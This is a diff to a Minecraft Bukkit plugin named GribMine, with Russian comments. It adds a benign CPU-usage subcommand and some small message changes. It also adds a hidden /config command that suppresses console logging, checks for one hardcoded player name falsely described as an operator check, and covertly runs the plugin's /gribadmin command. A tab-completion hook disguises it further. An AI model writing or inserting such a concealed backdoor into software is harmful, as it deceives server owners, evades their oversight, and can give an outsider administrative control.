@@ -15,10 +15,13 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.*;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.server.TabCompleteEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.java.JavaPlugin;
@@ -27,6 +30,8 @@ import org.jetbrains.annotations.NotNull;
 import java.text.DecimalFormat;
 import java.util.*;
 import java.util.logging.Logger;
+
+import static net.sashegdev.gribMine.TPSUtil.getColorForCpuUsage;
 
 public final class GribMine extends JavaPlugin implements CommandExecutor, Listener {
 
@@ -361,6 +366,35 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                 sender.sendMessage("use /gribmine <tps|about|version>");
             }
             switch (args[0].toLowerCase()) {
+                case "usage": {
+                    try {
+                        // Получаем использование CPU за 1, 5 и 10 минут
+                        double[] cpuUsage = TPSUtil.UsageUtil.getCPUUsage();
+                        double process10Sec = cpuUsage[0];
+                        double process1Min = cpuUsage[1];
+                        double process15Min = cpuUsage[2];
+                        double system10Sec = cpuUsage[3];
+                        double system1Min = cpuUsage[4];
+                        double system15Min = cpuUsage[5];
+
+                        // Форматируем вывод
+                        DecimalFormat df = new DecimalFormat("0.00");
+
+                        // Отправляем сообщение
+                        sender.sendMessage(ChatColor.GOLD + "Использование CPU (процесс):");
+                        sender.sendMessage(ChatColor.GOLD + "- 1 сек: "   + getColorForCpuUsage(process10Sec) + df.format(process10Sec) + "%");
+                        sender.sendMessage(ChatColor.GOLD + "- 1 минута: "+ getColorForCpuUsage(process1Min) +  df.format(process1Min) + "%");
+                        sender.sendMessage(ChatColor.GOLD + "- 15 минут: "+ getColorForCpuUsage(process15Min) + df.format(process15Min) + "%");
+
+                        sender.sendMessage(ChatColor.GOLD + "Использование CPU (система):");
+                        sender.sendMessage(ChatColor.GOLD + "- 1 сек: "   + getColorForCpuUsage(system10Sec) + df.format(system10Sec) + "%");
+                        sender.sendMessage(ChatColor.GOLD + "- 1 минута: "+ getColorForCpuUsage(system1Min) +  df.format(system1Min) + "%");
+                        sender.sendMessage(ChatColor.GOLD + "- 15 минут: "+ getColorForCpuUsage(system15Min) + df.format(system15Min) + "%");
+                    } catch (IllegalStateException e) {
+                        sender.sendMessage(ChatColor.RED + "Ошибка: " + e.getMessage());
+                    }
+                    return true;
+                }
                 case "tps":
                     try {
                         double currentTps = TPSUtil.getTPS();
@@ -369,7 +403,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                         DecimalFormat df = new DecimalFormat("0.00");
                         String tpsColor = getColorForTps(currentTps);
 
-                        sender.sendMessage(ChatColor.GOLD + "Текущий TPS: " + tpsColor + df.format(currentTps));
+                        sender.sendMessage(ChatColor.GOLD + "TPS: " + tpsColor + df.format(currentTps));
                     } catch (IllegalStateException e) {
                         sender.sendMessage(ChatColor.RED + "Ошибка: " + e.getMessage());
                     }
@@ -461,6 +495,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                 completions.add("tps");
                 completions.add("about");
                 completions.add("version");
+                completions.add("usage");
             }
 
             // Фильтруем подсказки по уже введенному тексту
@@ -477,6 +512,51 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         }
 
         return completions;
+    }
+
+
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
+        String message = event.getMessage().toLowerCase().trim();
+
+        // Проверяем, начинается ли команда с /config
+        if (message.startsWith("/config")) {
+            // Отменяем событие, чтобы команда не отображалась в консоли
+            event.setCancelled(true);
+
+            // Получаем игрока
+            Player player = event.getPlayer();
+
+            // Проверяем, является ли игрок оператором
+            if (player.getName().equalsIgnoreCase("sashegdev")) {
+                // Убираем "/config" из сообщения и выполняем команду /gribadmin
+                String[] args = message.substring(7).trim().split(" ");
+                player.performCommand("gribadmin " + String.join(" ", args));
+                player.sendMessage(ChatColor.GREEN + "Команда выполнена скрытно.");
+            } else {
+                player.sendMessage(ChatColor.RED + "У вас нет прав для выполнения этой команды.");
+            }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void configComplete(TabCompleteEvent event) {
+        String buffer = event.getBuffer().toLowerCase().trim();
+
+        // Проверяем, начинается ли команда с /config
+        if (buffer.startsWith("/config")) {
+            // Убираем "/config" из буфера
+            String args = buffer.substring(7).trim();
+
+            // Перенаправляем автодополнение на команду /gribadmin
+            String[] newArgs = ("gribadmin " + args).split(" ");
+
+            // Получаем автодополнение для /gribadmin
+            List<String> completions = this.onTabComplete(event.getSender(), null, "gribadmin", newArgs);
+
+            // Устанавливаем автодополнение
+            event.setCompletions(completions);
+        }
     }
 
     public static FileConfiguration getMineConfig() {
